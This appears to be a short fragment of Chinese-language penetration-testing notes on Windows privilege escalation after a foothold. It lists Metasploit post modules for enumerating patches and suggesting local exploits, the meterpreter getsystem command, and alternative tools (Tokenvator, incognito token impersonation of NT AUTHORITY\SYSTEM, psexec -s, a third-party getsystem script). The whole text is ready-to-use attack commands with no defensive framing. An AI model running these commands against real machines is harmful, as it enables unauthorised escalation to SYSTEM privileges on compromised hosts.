	发现补丁
	>use post/windows/gather/enum_patches
	列举可用EXP
	>use post/multi/recon/local_exploit_suggester
  ##### getsystem
  	meterpreter> getsystem 
  ##### getsystem替代者
  	>Tokenvator.exe getsystem cmd.exe 
	>incognito.exe execute -c "NT AUTHORITY\SYSTEM" cmd.exe 
	>psexec -s -i cmd.exe 
	>python getsystem.py # from https://github.com/sailay1996/tokenx_privEsc